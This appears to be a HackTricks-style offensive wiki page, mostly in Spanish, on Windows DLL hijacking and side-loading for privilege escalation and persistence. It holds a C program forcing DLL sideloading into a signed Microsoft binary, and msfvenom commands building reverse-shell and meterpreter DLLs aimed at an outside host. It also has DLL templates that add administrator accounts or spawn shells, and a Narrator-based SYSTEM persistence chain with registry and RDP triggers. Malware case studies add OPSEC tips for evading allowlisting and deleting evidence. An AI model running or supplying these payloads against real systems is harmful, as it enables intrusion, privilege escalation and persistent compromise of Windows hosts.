# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Información básica

DLL Hijacking implica manipular una aplicación confiable para que cargue una DLL maliciosa. Este término abarca varias tácticas como **DLL Spoofing, Injection, and Side-Loading**. Se utiliza principalmente para ejecución de código, lograr persistencia y, con menos frecuencia, escalada de privilegios. A pesar del enfoque en la escalada aquí, la técnica de DLL Hijacking se mantiene consistente entre objetivos.

### Técnicas comunes

Se emplean varios métodos para DLL hijacking, y su efectividad depende de la estrategia de carga de DLL del aplicativo:

1. **DLL Replacement**: Reemplazar una DLL genuina por una maliciosa, opcionalmente usando DLL Proxying para preservar la funcionalidad original.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda antes que la legítima, explotando el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa para que la aplicación la cargue pensando que es una DLL requerida que no existe.
4. **DLL Redirection**: Modificar parámetros de búsqueda como %PATH% o archivos .exe.manifest / .exe.local para dirigir la aplicación hacia la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una maliciosa en el directorio WinSxS, un método a menudo asociado con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto con la aplicación copiada, asemejándose a técnicas de Binary Proxy Execution.

> [!TIP]
> Para una cadena paso a paso que apila HTML staging, AES-CTR configs y .NET implants sobre DLL sideloading, revisa el flujo de trabajo abajo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

The most common way to find missing Dlls inside a system is running [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from sysinternals, **setting** the **following 2 filters**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

and just show the **File System Activity**:

![](<../../../images/image (153).png>)

If you are looking for **missing dlls in general** you **leave** this running for some **seconds**.\
If you are looking for a **missing dll inside an specific executable** you should set **another filter like "Process Name" "contains" `<exec name>`, execute it, and stop capturing events**.

## Explotando Dlls faltantes

Para escalar privilegios, la mejor oportunidad es poder **escribir una dll que un proceso privilegiado vaya a intentar cargar** en alguno de los **lugares donde se va a buscar**. Por lo tanto, podremos **escribir** una dll en una **carpeta** donde la **dll se busca antes** que la carpeta donde está la **dll original** (caso raro), o podremos **escribir en alguna carpeta donde la dll vaya a ser buscada** y la dll original **no exista** en ninguna carpeta.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Las aplicaciones Windows buscan DLLs siguiendo un conjunto de rutas de búsqueda predefinidas, respetando una secuencia particular. El problema de DLL hijacking surge cuando una DLL maliciosa se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que la DLL auténtica. Una solución para evitar esto es asegurarse de que la aplicación use rutas absolutas cuando se refiera a las DLL que necesita.

Puedes ver el **DLL search order on 32-bit** systems abajo:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ese es el orden de búsqueda **por defecto** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual asciende a la segunda posición. Para desactivar esta característica, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y ponlo a 0 (por defecto está habilitado).

Si la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) se llama con **LOAD_WITH_ALTERED_SEARCH_PATH**, la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Finalmente, ten en cuenta que **una dll podría ser cargada indicando la ruta absoluta en lugar solo del nombre**. En ese caso esa dll **solo se buscará en esa ruta** (si la dll tiene dependencias, estas se buscarán como cargadas por nombre).

Hay otras formas de alterar el orden de búsqueda pero no las voy a explicar aquí.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir determinísticamente en la ruta de búsqueda de DLL de un proceso recién creado es establecer el campo DllPath en RTL_USER_PROCESS_PARAMETERS cuando se crea el proceso con las APIs nativas de ntdll. Al suministrar aquí un directorio controlado por el atacante, un proceso objetivo que resuelva una DLL importada por nombre (sin ruta absoluta y sin usar los flags de carga segura) puede ser forzado a cargar una DLL maliciosa desde ese directorio.

Idea clave
- Construir los parámetros del proceso con RtlCreateProcessParametersEx y proporcionar un DllPath personalizado que apunte a tu carpeta controlada (por ejemplo, el directorio donde vive tu dropper/unpacker).
- Crear el proceso con RtlCreateUserProcess. Cuando el binario objetivo resuelva una DLL por nombre, el loader consultará este DllPath suministrado durante la resolución, permitiendo sideloading fiable incluso cuando la DLL maliciosa no está colocada junto al EXE objetivo.

Notas/limitaciones
- Esto afecta al proceso hijo que se crea; es diferente de SetDllDirectory, que afecta solo al proceso actual.
- El objetivo debe importar o llamar a LoadLibrary a una DLL por nombre (sin ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs y rutas absolutas codificadas no pueden ser hijackeadas. Forwarded exports y SxS pueden cambiar la precedencia.

Ejemplo mínimo en C (ntdll, wide strings, manejo de errores simplificado):

<details>
<summary>Ejemplo completo en C: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Ejemplo de uso operativo
- Coloca un xmllite.dll malicioso (exportando las funciones requeridas o haciendo proxy al real) en tu directorio DllPath.
- Ejecuta un binario firmado que se sabe que busca xmllite.dll por nombre usando la técnica anterior. El loader resuelve la importación vía el DllPath suministrado y sideloads tu DLL.

Esta técnica se ha observado en-the-wild para impulsar cadenas de sideloading multi-etapa: un launcher inicial deja un helper DLL, que luego spawnea un binario Microsoft-signed, hijackable, con un DllPath personalizado para forzar la carga del DLL del atacante desde un staging directory.


#### Excepciones en el orden de búsqueda de dll según la documentación de Windows

Ciertas excepciones al orden estándar de búsqueda de DLL están anotadas en la documentación de Windows:

- Cuando se encuentra una **DLL que comparte su nombre con una ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, realiza una comprobación de redirección y un manifiesto antes de recurrir a la DLL ya cargada en memoria. **En este escenario, el sistema no realiza una búsqueda de la DLL**.
- En los casos en que la DLL sea reconocida como una **known DLL** para la versión actual de Windows, el sistema utilizará su versión de la known DLL, junto con cualquiera de sus DLL dependientes, **omitiendo el proceso de búsqueda**. La clave del registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas known DLLs.
- Si una **DLL tiene dependencias**, la búsqueda de estas DLL dependientes se realiza como si estuvieran indicadas únicamente por sus **module names**, independientemente de si la DLL inicial fue identificada mediante una ruta completa.

### Escalando privilegios

**Requisitos**:

- Identificar un proceso que opere o vaya a operar bajo **privilegios diferentes** (movimiento horizontal o lateral), que **carezca de una DLL**.
- Asegurarse de que haya **acceso de escritura** disponible para cualquier **directorio** en el que se **buscará** la **DLL**. Esta ubicación puede ser el directorio del ejecutable o un directorio dentro de la ruta del sistema.

Sí, los requisitos son complicados de encontrar ya que **por defecto es algo raro encontrar un ejecutable privilegiado sin una dll** y es aún **más raro tener permisos de escritura en una carpeta de la ruta del sistema** (no puedes por defecto). Pero, en entornos mal configurados esto es posible.\
En el caso de que tengas suerte y cumplas los requisitos, puedes revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Incluso si el **objetivo principal del proyecto es bypass UAC**, puede que encuentres allí un **PoC** de Dll hijacking para la versión de Windows que te sirva (probablemente cambiando la ruta de la carpeta donde tengas permisos de escritura).

Ten en cuenta que puedes **comprobar tus permisos en una carpeta** haciendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **comprueba los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes comprobar los imports de un ejecutable y los exports de una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para una guía completa sobre cómo **abusar de Dll Hijacking para escalar privilegios** con permisos para escribir en una **System Path folder** consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Herramientas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)comprobará si tienes permisos de escritura en cualquier carpeta dentro del system PATH.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll_.

### Ejemplo

En caso de encontrar un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear un dll que exporte al menos todas las funciones que el ejecutable importará desde él**. Ten en cuenta que Dll Hijacking resulta útil para [escalar desde Medium Integrity level a High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o desde [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system). Puedes encontrar un ejemplo de **cómo crear un dll válido** en este estudio sobre dll hijacking centrado en la ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Además, en la **siguiente sección** puedes encontrar algunos **códigos dll básicos** que podrían ser útiles como **plantillas** o para crear un **dll con funciones no requeridas exportadas**.

## **Creando y compilando Dlls**

### **Dll Proxifying**

Básicamente un **Dll proxy** es un Dll capaz de **ejecutar tu código malicioso cuando se carga** pero también de **exponerse** y **funcionar** como **se espera** reenviando todas las llamadas a la biblioteca real.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes indicar un ejecutable y seleccionar la librería que quieres proxify y generar un proxified dll, o indicar el Dll y generar un proxified dll.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86, no vi una versión x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propio

Ten en cuenta que en varios casos la Dll que compiles debe **exportar varias funciones** que serán cargadas por el proceso víctima. Si estas funciones no existen, el binary no podrá cargarlas y el exploit fallará.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Ejemplo de DLL en C++ con creación de usuario</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL en C alternativa con entrada de hilo</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudio de caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe aún busca una DLL de localización predecible y específica por idioma al iniciarse que puede ser hijacked para arbitrary code execution y persistence.

Datos clave
- Ruta comprobada (versiones actuales): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ruta heredada (versiones antiguas): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si existe una DLL controlada por el atacante y escribible en la ruta OneCore, se carga y `DllMain(DLL_PROCESS_ATTACH)` se ejecuta. No se requieren exports.

Detección con Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Inicie Narrator y observe el intento de carga de la ruta anterior.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flujo de ataque

1. Como usuario estándar, coloca `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Espera a que la tarea programada se ejecute a las 9:30 AM en el contexto del usuario actual.
3. Si un administrador ha iniciado sesión cuando se ejecuta la tarea, el DLL malicioso se ejecuta en la sesión del administrador con integridad media.
4. Encadena técnicas estándar de bypass de UAC para elevar de integridad media a privilegios SYSTEM.

## Estudio de caso: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frecuentemente combinan droppers basados en MSI con DLL side-loading para ejecutar payloads bajo un proceso confiable y firmado.

Chain overview
- El usuario descarga un MSI. Un CustomAction se ejecuta silenciosamente durante la instalación GUI (p. ej., LaunchApplication o una acción VBScript), reconstruyendo la siguiente etapa desde recursos embebidos.
- El dropper escribe un EXE legítimo y firmado y un DLL malicioso en el mismo directorio (par de ejemplo: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Cuando se inicia el EXE firmado, el orden de búsqueda de DLL de Windows carga wsc.dll desde el directorio de trabajo primero, ejecutando el código del atacante bajo un padre firmado (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Busca entradas que ejecuten ejecutables o VBScript. Patrón sospechoso de ejemplo: LaunchApplication ejecutando un archivo embebido en segundo plano.
- En Orca (Microsoft Orca.exe), inspecciona las tablas CustomAction, InstallExecuteSequence y Binary.
- Payloads embebidos/divididos en el CAB del MSI:
- Extracción administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- O usa lessmsi: lessmsi x package.msi C:\out
- Busca múltiples fragmentos pequeños que se concatenan y desencriptan mediante un CustomAction VBScript. Flujo común:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Coloca estos dos archivos en la misma carpeta:
- wsc_proxy.exe: host legítimo firmado (Avast). El proceso intenta cargar wsc.dll por nombre desde su directorio.
- wsc.dll: attacker DLL. Si no se requieren exports específicos, DllMain puede ser suficiente; de lo contrario, crea un proxy DLL y reenvía los exports requeridos a la genuine library mientras ejecutas el payload en DllMain.
- Construye un payload DLL mínimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de exportación, use un framework de proxy (por ejemplo, DLLirant/Spartacus) para generar un DLL de reenvío que también ejecute su payload.

- Esta técnica se basa en la resolución de nombres de DLL por parte del binario anfitrión. Si el anfitrión usa rutas absolutas o flags de carga segura (por ejemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijack puede fallar.
- KnownDLLs, SxS, and forwarded exports pueden influir en la precedencia y deben considerarse al seleccionar el binario anfitrión y el conjunto de exports.

## Tríadas firmadas + payloads cifrados (estudio de caso ShadowPad)

Check Point describió cómo Ink Dragon despliega ShadowPad usando una **tríada de tres archivos** para mezclarse con software legítimo mientras mantiene el payload principal cifrado en disco:

1. **EXE anfitrión firmado** – se abusan de vendors como AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Los atacantes renombran el ejecutable para que parezca un binario de Windows (por ejemplo `conhost.exe`), pero la firma Authenticode permanece válida.
2. **Malicious loader DLL** – dejado junto al EXE con un nombre esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). El DLL suele ser un binario MFC ofuscado con el framework ScatterBrain; su único trabajo es localizar el blob cifrado, descifrarlo y mapear reflectivamente ShadowPad.
3. **Blob de payload cifrado** – a menudo almacenado como `<name>.tmp` en el mismo directorio. Después de mapear en memoria el payload descifrado, el loader borra el archivo TMP para destruir evidencia forense.

Tradecraft notes:

* Renombrar el EXE firmado (manteniendo el `OriginalFileName` en el PE header) permite que se haga pasar por un binario de Windows y, al mismo tiempo, conserve la firma del vendor; por tanto, reproduzca la costumbre de Ink Dragon de dejar binarios con aspecto `conhost.exe` que en realidad son utilidades AMD/NVIDIA.
* Debido a que el ejecutable permanece como confiable, la mayoría de los controles de allowlisting solo necesitan que su DLL maliciosa esté junto a él. Enfóquese en personalizar el loader DLL; el padre firmado normalmente puede ejecutarse sin modificaciones.
* El descifrador de ShadowPad espera que el blob TMP esté junto al loader y sea escribible para poder poner a cero el archivo después de mapearlo. Mantenga el directorio escribible hasta que el payload se cargue; una vez en memoria el archivo TMP puede borrarse de forma segura por OPSEC.

## Estudio de caso: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una intrusión reciente de Lotus Blossom abusó de una cadena de actualización confiable para entregar un dropper empaquetado con NSIS que preparó un DLL sideload más payloads completamente en memoria.

Tradecraft flow
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca **HIDDEN**, deja un Bitdefender Submission Wizard renombrado `BluetoothService.exe`, un `log.dll` malicioso y un blob cifrado `BluetoothService`, luego lanza el EXE.
- El EXE anfitrión importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` carga el blob con mmap; `LogWrite` lo descifra con un stream basado en LCG personalizado (constantes **0x19660D** / **0x3C6EF35F**, material de clave derivado de un hash previo), sobrescribe el buffer con shellcode en texto plano, libera temporales y salta a él.
- Para evitar una IAT, el loader resuelve APIs hasheando nombres de exports usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, luego aplicando una avalancha estilo Murmur (**0x85EBCA6B**) y comparando contra hashes objetivo salados.

Main shellcode (Chrysalis)
- Descifra un módulo principal tipo PE repitiendo add/XOR/sub con la clave `gQ2JR&9;` durante cinco pasadas, luego carga dinámicamente `Kernel32.dll` → `GetProcAddress` para completar la resolución de imports.
- Reconstruye cadenas de nombres de DLL en tiempo de ejecución mediante transformaciones por carácter (rotación de bits/XOR), luego carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un segundo resolvedor que recorre la **PEB → InMemoryOrderModuleList**, analiza cada tabla de exports en bloques de 4 bytes con mezcla estilo Murmur, y solo recurre a `GetProcAddress` si no se encuentra el hash.

Embedded configuration & C2
- La configuración vive dentro del archivo `BluetoothService` dejado en **offset 0x30808** (tamaño **0x980**) y está descifrada con RC4 usando la clave `qwhvb^435h&*7`, revelando la URL de C2 y el User-Agent.
- Los beacons construyen un perfil del host delimitado por puntos, anteponen la etiqueta `4Q`, luego lo encriptan con RC4 con la clave `vAuig34%^325hGV` antes de `HttpSendRequestA` sobre HTTPS. Las respuestas se descifran con RC4 y se enrutan mediante un switch de etiquetas (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + casos de transferencia por fragmentos).
- El modo de ejecución viene determinado por los args de la CLI: sin args = instalar persistencia (service/Run key) apuntando a `-i`; `-i` relanza a sí mismo con `-k`; `-k` omite la instalación y ejecuta el payload.

Alternate loader observed
- La misma intrusión dejó Tiny C Compiler y ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` a su lado. El código C proporcionado por el atacante embebió shellcode, lo compiló y lo ejecutó en memoria sin tocar el disco con un PE. Replicar con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa compile-and-run basada en TCC importó `Wininet.dll` en tiempo de ejecución y descargó un shellcode de segunda etapa desde una hardcoded URL, proporcionando un loader flexible que se hace pasar por una ejecución de compilador.

## Referencias

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
